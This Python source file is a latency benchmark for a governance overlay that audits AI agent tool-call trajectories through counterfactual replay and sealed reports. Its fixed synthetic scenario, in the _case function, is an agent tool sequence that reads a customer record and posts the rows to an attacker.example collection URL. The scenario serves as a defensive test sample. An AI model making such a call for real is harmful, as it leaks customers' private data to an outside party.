"""Reproducible causal-overlay latency benchmark.

Run from the repository root:

    python -m runtime_eval.causal_overlay.benchmark --repetitions 40

The 8/16 workloads cycle the finite v0.1 one-variable intervention registry.
That measures executor scaling without pretending v0.1 supports 16 distinct
causal claims for one two-step scenario.
"""

from __future__ import annotations

import argparse
import json
import platform
import sys
import time
from dataclasses import replace

from .counterfactual_replay import capture_governed_trajectory
from .intervention_engine import generate_interventions
from .latency import deployment_recommendation, summarize_ms
from .report import _replay_all, analyze, submit_shadow
from .variable_extractor import extract_variables


COUNTS = (1, 2, 4, 8, 16)


def _case():
    return capture_governed_trajectory([
        {"tool": "read_customer_record",
         "args": {"customer_id": "synthetic"}},
        {"tool": "http_request",
         "args": {"url": "https://attacker.example/collect",
                  "body": "rows"}},
    ], trajectory_id="benchmark-secret-exfiltration",
       scenario_hint="secret_exfiltration")


def _expand(base, count):
    if not base:
        return ()
    return tuple(replace(
        base[i % len(base)],
        intervention_id=f"{base[i % len(base)].intervention_id}__bench_{i}")
        for i in range(count))


def run_benchmark(repetitions: int = 40, max_workers: int = 4) -> dict:
    if repetitions < 2:
        raise ValueError("repetitions must be at least 2")
    canonical, extraction, template, generation = [], [], [], []
    contribution, report_build, sealing, overlay_total = [], [], [], []
    sync_e2e, async_latency, async_submit_overhead = [], [], []
    replay = {str(n): {"sequential": [], "parallel": [], "individual": []}
              for n in COUNTS}
    equivalence = True

    fixed = _case()
    extracted = extract_variables(fixed)
    base = generate_interventions(fixed, extracted)

    for _ in range(repetitions):
        case = _case()
        canonical.append(case.factual.replay_latency_ms)

        report = analyze(case, replay_mode="parallel",
                         compare_replay_modes=True, max_workers=max_workers)
        lm = report.latency_metrics
        extraction.append(lm.variable_extraction_ms)
        template.append(lm.template_construction_ms)
        generation.append(lm.intervention_generation_ms)
        contribution.append(lm.contribution_trace_ms)
        report_build.append(lm.report_construction_ms)
        sealing.append(lm.evidence_sealing_ms)
        overlay_total.append(lm.total_overlay_ms)
        sync_e2e.append(lm.synchronous_end_to_end_ms)
        async_latency.append(lm.async_canonical_governance_ms)

        t0 = time.perf_counter()
        _, future = submit_shadow(case, replay_mode="parallel",
                                  max_workers=max_workers)
        async_submit_overhead.append((time.perf_counter() - t0) * 1000.0)
        future.result(timeout=10)

        for n in COUNTS:
            interventions = _expand(base, n)
            seq, seq_ms = _replay_all(
                fixed, extracted, interventions, "sequential", max_workers)
            par, par_ms = _replay_all(
                fixed, extracted, interventions, "parallel", max_workers)
            equivalence = equivalence and seq == par
            row = replay[str(n)]
            row["sequential"].append(seq_ms)
            row["parallel"].append(par_ms)
            row["individual"].extend(
                item.replay_latency_ms for item in seq)

    output = {
        "environment": {
            "python": sys.version.split()[0],
            "platform": platform.platform(),
            "processor": platform.processor() or "not reported",
            "max_workers": max_workers,
            "repetitions": repetitions,
            "scenario": "read_customer_record -> http_request external",
            "intervention_counts": list(COUNTS),
            "workload_note": (
                "counts above the finite v0.1 registry cycle deterministic "
                "one-variable interventions for executor scaling"),
        },
        "canonical_governance": summarize_ms(canonical),
        "causal_extraction": summarize_ms(extraction),
        "template_construction": summarize_ms(template),
        "intervention_generation": summarize_ms(generation),
        "counterfactual_replay": {},
        "contribution_trace": summarize_ms(contribution),
        "report_construction": summarize_ms(report_build),
        "evidence_sealing": summarize_ms(sealing),
        "overlay_total": summarize_ms(overlay_total),
        "synchronous_end_to_end": summarize_ms(sync_e2e),
        "async_canonical_governance": summarize_ms(async_latency),
        "async_canonical_path_overhead": summarize_ms(async_submit_overhead),
        "parallel_sequential_equivalent": equivalence,
    }
    for n in COUNTS:
        row = replay[str(n)]
        output["counterfactual_replay"][str(n)] = {
            "individual": summarize_ms(row["individual"]),
            "sequential": summarize_ms(row["sequential"]),
            "parallel": summarize_ms(row["parallel"]),
            "p50_speedup": round(
                summarize_ms(row["sequential"])["p50_ms"] /
                max(summarize_ms(row["parallel"])["p50_ms"], 1e-9), 3),
        }
    output["recommendation"] = deployment_recommendation(output)
    return output


def render_markdown(result: dict) -> str:
    env = result["environment"]
    lines = [
        "# Causal Overlay Benchmark",
        "",
        "Measured locally; results are bounded to this host and scenario.",
        "",
        "## Environment",
        "",
        f"- Python: `{env['python']}`",
        f"- Platform: `{env['platform']}`",
        f"- Processor: `{env['processor']}`",
        f"- Repetitions: `{env['repetitions']}`",
        f"- Parallel workers: `{env['max_workers']}`",
        f"- Scenario: `{env['scenario']}`",
        f"- Workload note: {env['workload_note']}",
        "",
        "## Stage latency",
        "",
        "| Stage | Mean ms | p50 ms | p95 ms | p99 ms |",
        "|---|---:|---:|---:|---:|",
    ]
    stages = (
        ("Canonical governance", "canonical_governance"),
        ("Causal extraction", "causal_extraction"),
        ("SCM template", "template_construction"),
        ("Intervention generation", "intervention_generation"),
        ("Contribution trace", "contribution_trace"),
        ("Report construction", "report_construction"),
        ("Evidence sealing", "evidence_sealing"),
        ("Overlay total", "overlay_total"),
        ("Synchronous end-to-end", "synchronous_end_to_end"),
        ("Async canonical governance", "async_canonical_governance"),
        ("Async submission overhead", "async_canonical_path_overhead"),
    )
    for label, key in stages:
        row = result[key]
        lines.append(f"| {label} | {row['mean_ms']:.3f} | "
                     f"{row['p50_ms']:.3f} | {row['p95_ms']:.3f} | "
                     f"{row['p99_ms']:.3f} |")
    lines += [
        "", "## Counterfactual replay scaling", "",
        "| Interventions | Sequential p50 ms | Sequential p95 ms | "
        "Parallel p50 ms | Parallel p95 ms | p50 speedup |",
        "|---:|---:|---:|---:|---:|---:|",
    ]
    for count in COUNTS:
        row = result["counterfactual_replay"][str(count)]
        lines.append(
            f"| {count} | {row['sequential']['p50_ms']:.3f} | "
            f"{row['sequential']['p95_ms']:.3f} | "
            f"{row['parallel']['p50_ms']:.3f} | "
            f"{row['parallel']['p95_ms']:.3f} | {row['p50_speedup']:.3f}× |")
    rec = result["recommendation"]
    lines += [
        "", "## Correctness and recommendation", "",
        f"- Sequential/parallel equivalence: "
        f"`{result['parallel_sequential_equivalent']}`",
        f"- Fast inline (1–2): **{rec['fast_inline']}**",
        f"- Bounded interactive (4–8): **{rec['bounded_interactive']}**",
        f"- Full forensic (16+): **{rec['full_forensic']}**",
        "- Classification is relative to the measured canonical p95 on this "
        "host; it is not a production SLA.",
        "", "## Limitations", "",
        "- The scenario is deterministic and uses the in-process synthetic "
        "Frontier tool manifest; it excludes network and model inference.",
        "- Full replay is the correctness baseline. Incremental descendant-only "
        "replay is not implemented.",
        "- Python threads preserve isolation but CPU-bound speedup depends on "
        "the interpreter and host scheduler.",
        "- Counts above the finite v0.1 intervention registry repeat real "
        "one-variable interventions solely to measure bounded executor scaling.",
    ]
    return "\n".join(lines) + "\n"


def main(argv=None) -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--repetitions", type=int, default=40)
    parser.add_argument("--max-workers", type=int, default=4)
    parser.add_argument("--json", action="store_true")
    args = parser.parse_args(argv)
    result = run_benchmark(args.repetitions, args.max_workers)
    print(json.dumps(result, indent=2, sort_keys=True)
          if args.json else render_markdown(result), end="")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
